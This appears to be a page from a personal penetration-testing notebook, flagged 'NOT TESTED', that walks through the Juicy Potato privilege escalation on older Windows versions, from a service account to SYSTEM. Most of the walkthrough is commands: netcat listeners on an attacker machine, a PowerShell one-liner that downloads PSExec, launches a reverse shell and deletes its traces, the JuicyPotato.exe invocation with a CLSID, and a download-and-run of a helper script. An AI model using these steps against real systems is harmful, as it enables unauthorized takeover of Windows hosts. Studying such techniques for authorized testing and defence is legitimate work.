<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Juicy Potato: RPC + NTLM relay</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Juicy Potato: RPC + NTLM relay</h1><br/><span style="color:#ff0000;">WARNING: NOT TESTED</span><br /><br /><strong><h2>Prerequisites</h2></strong><br />• <strong>OS Prerequisite:</strong><br />   ◇ Windows OS &lt; Windows 10 1809 <br />   ◇ Windows OS &lt; Windows Server 2019<br />• <strong>User privileges prerequisite:</strong><br />We need to be able to spawn a shell with Service Account privilege. <br />This because Service Accounts have “SeImpersonatePrivilege” privilege enabled<br /><span style="text-decoration:underline;">How get a Service Account&#39;s shell?</span><br />   ◇ MSSQL Injection → use xp_cmdshell procedure that run command as the SQL Server service account<br />   ◇ Since IIS runs with the permission of a Service Account, if we are able to run ASPX code on the Web Server, we can get a reverse shell running as Service account<br />        <br /><strong>Vulnerability:</strong><br />• This is a Privilege Escalation from a <span style="text-decoration:underline;">Windows Service Accounts</span> to <span style="text-decoration:underline;">NT AUTHORITY\SYSTEM</span><br />• <a href="Penetration_Test_Methodology--Network_Pentest--Post_Exploitation--Privilege_Escalation--Windows_Privilege_Escalation--2._Service_Exploits.html">Service accounts</a> can be given special privileges in order for them to run their services, and cannot be logged into directly. Multiple problems have been found with service accounts, making them easier to escalate privileges with.<br />• Service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user. This was possible because Service Accounts usually have the “SeImpersonatePrivilege” privilege enabled.<br /><br /><br />GitHub: <a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a><br />Juicy Potato is <a href="Spoofing-Poisoning--NetNTLM_attacks--Man-in-the-Middle_techniques_(IPv4)--Juicy_Potato_RPC_+_NTLM_relay--Rotten_Potato_(see_Juicy_Potato).html">Rotten Potato</a> on steroids. It allows a more flexible way to exploit the vulnerability. <br /><br /><strong>Advantages over Rotten Potato exploit</strong><br />• We do not need to have a meterpreter shell<br />• We can specify our COM(communication port) server listen port with CLSID<br />   ◇ CLSID is a globally unique identifier that identifies a COM class object. It is an identifier like UUID.<br /><br /><br /><strong><span style="color:#a5452a;">example with Windows 7</span></strong> (running with Administrative shell <strong><span style="text-decoration:underline;">only for demonstration</span></strong>)<br />1. Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to Windows.<br />2. Start a listener on the attacker machine<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span>#  nc -nvlp 53</pre></div><br />4. Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the LOCAL SERVICE account:<br />     &quot;LOCAL SERVICE&quot; user account is a built in service account in windows<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://download.sysinternals.com/files/PSTools.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>;<span style="color:#ff9d00;font-weight:700">md</span> <span style="color:#0088ff;font-weight:400">$env</span><span style="color:#ff9d00;font-weight:700">:</span>userprofile<span style="color:#ff9d00;font-weight:700">\</span>desktop<span style="color:#ff9d00;font-weight:700">\</span>files; <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\files&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\files\PSExec.exe -accepteula -i -u &#39;nt authority\local service&#39; &#39;C:\PrivEsc\reverse.exe&#39;&quot;</span>; <span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\files&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>recurse; <span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>;</pre></div>   <br />5. Now on the listener of the Attacker we should have a shell as <span style="text-decoration:underline;">LOCAL SERVICE account</span><br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> <span style="color:#ff9d00;font-weight:700">whoami</span><br />C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> <span style="color:#ff9d00;font-weight:700">whoami</span> <span style="color:#ff9d00;font-weight:700">/</span>priv     <span style="color:#0088ff;font-weight:400">#to check privileges</span></pre></div><br />    we need one of the following privilege:<br />   ◇ SeAssignPrimaryPrivilege (SeAssignPrimaryTokenPrivilege)<br />   ◇ SeImpersonatePrivilege <br />    <a href=""><img src="images/1342-1.png" alt="images/1342-1.png" /></a><br />8. Start a new listener always on the attacker machine<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span>#  nc -nvlp 53</pre></div><br />9. Run the Juicy Potato exploit to trigger a reverse shell running with SYSTEM privileges<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> .<span style="color:#333333;font-weight:400">\J</span>uicyPotato.exe -l 1337 -p C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\P</span>rivEsc<span style="color:#333333;font-weight:400">\r</span>everse.exe -t * -c <span style="color:#ff9d00;font-weight:700">{</span>03ca98d6-ff5d-49b8-abc6-03dd84127020<span style="color:#ff9d00;font-weight:700">}</span></pre></div><br />    If CLSID {03ca98d6-ff5d-49b8-abc6-03dd84127020} doesn’t work:<br />   ◇ check this list for different Windows OSs: <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a><br />   ◇ or execute GetCLSID.ps1 PowerShell script to get the CLSID<br />    <div class="codebox"><pre>PS&gt; <span style="color:#ff9d00;font-weight:700">(</span>new-object System.Net.WebClient<span style="color:#ff9d00;font-weight:700">)</span>.DownloadFile<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\GetCLSID.ps1&quot;</span><span style="color:#ff9d00;font-weight:700">);</span>Invoke-Expression <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\GetCLSID.ps1&quot;</span><span style="color:#ff9d00;font-weight:700">;</span>Remove-Item -Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\GetCLSID.ps1&quot;</span><span style="color:#ff9d00;font-weight:700">;</span></pre></div><br /><br /><br /><strong><span style="color:#a5452a;"><br /><br /></span></strong></div>
</body>
</html>
